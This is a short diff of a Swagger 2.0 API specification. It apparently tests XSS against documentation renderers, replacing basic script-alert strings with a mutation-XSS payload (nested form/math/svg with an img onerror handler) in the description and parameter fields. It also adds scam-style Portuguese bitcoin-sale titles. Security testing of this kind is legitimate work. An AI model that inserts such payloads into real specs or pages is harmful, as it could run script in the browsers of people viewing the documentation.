@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: "<script>alert('Test');</script>"
+  title: Comercio de Bitcoins para funcionarios internos
   description: |
-    description: "<script>alert('Test');</script>"
+    <form><math><mtext></form><form><mglyph><svg><mtext><TESTE><path id="</TESTE><img onerror=alert('TESTE') src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -26,7 +26,9 @@ paths:
   '/accounts/groupid/{id}':
     delete:
       parameters:
-        - description: "Parameter description here"
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><TESTE><path id="</TESTE><img onerror=alert('TESTE') src=1>"></form>
+
           format: int64
           in: path
           name: id
@@ -59,5 +61,4 @@ securityDefinitions:
     type: basic
 tags:
   - description: Apenas bitcoin e etherium são aceitas
-    name: "<script>alert('Test');</script>"
-
+    name: Venda de Bitcoins 100% Seguro !!!
